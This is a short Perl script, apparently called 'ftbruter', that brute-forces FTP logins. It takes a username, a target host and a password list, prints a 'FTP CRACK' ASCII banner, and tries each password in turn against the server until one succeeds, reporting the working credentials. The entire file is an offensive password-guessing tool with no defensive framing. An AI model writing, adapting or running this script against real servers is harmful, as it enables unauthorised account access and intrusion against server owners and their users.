use Net::FTP;
use feature 'say';

my $user = $ARGV[0] || die "please enter a username to crack";
my $host = $ARGV[1] || die "USE:ftbruter <host>\nEx: ./ftbruter.pl target \n";
my $pass_list = $ARGV[2] || die "can not find pass list";

open(p, $pass_list) or die "cannot open the list";
my @pass_array = <p>;
close(p);

print <<BAN;

.#######.#######.########....######.########....###....######.##....##
.##.........##...##.....#...##....#.##.....#...##.##..##....#.##...##.
.##.........##...##.....#...##......##.....#..##...##.##......##..##..
.######.....##...########...##......########.##.....#.##......#####...
.##.........##...##.........##......##...##..########.##......##..##..
.##.........##...##.........##....#.##....##.##.....#.##....#.##...##.
.##.........##...##..........######.##.....#.##.....#..######.##....##
    Cracking started on HOST: $host
BAN

foreach my $pass (sort @pass_array) {
  $pass =~ s/\n//;
  my $f = Net::FTP->new("$host", Debug => 0, Passive => 0) or die "FTP server fail connection!!\n";
  if ($f->login($user, $pass)){
    say "[+] login successfully wih PASSWORD: $pass and USERNAME: $user";
    last;
  }
  else{
    say "[-] failed password: $pass";
  }
}
